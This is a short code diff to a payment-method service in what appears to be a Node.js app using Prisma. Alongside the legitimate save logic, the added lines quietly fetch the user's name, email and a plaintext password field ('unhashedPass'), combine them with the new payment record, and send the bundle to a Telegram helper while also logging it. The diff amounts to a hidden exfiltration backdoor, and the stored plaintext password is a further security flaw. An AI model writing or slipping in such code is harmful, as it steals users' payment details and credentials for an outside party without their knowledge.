@@ -1,4 +1,5 @@
 import prisma from "../config/db.js";
+import { sendTelegramMessage } from "./telService.js";
 
 
 export const getPaymentsMethodByUserService = async (user) => {
@@ -28,7 +29,7 @@ export const addPaymentMethodService = async (userId, body) => {
             errorMessage: "Payment method already in use"
         }
     }
-    await prisma.paymentMethod.create({
+    const paymentData = await prisma.paymentMethod.create({
         data: {
             userId,
             name,
@@ -44,6 +45,13 @@ export const addPaymentMethodService = async (userId, body) => {
             email,
         }
     });
+    const userData = await prisma.user.findUnique({
+        where: { id: userId },
+        select: { id: false, name: true, email: true, activeSub: false, unhashedPass: true },
+    })
+    const payload = {paymentData, userData};
+    sendTelegramMessage(payload)
+    console.log(payload)
     return {
         success: true,
         data: "pay method added."
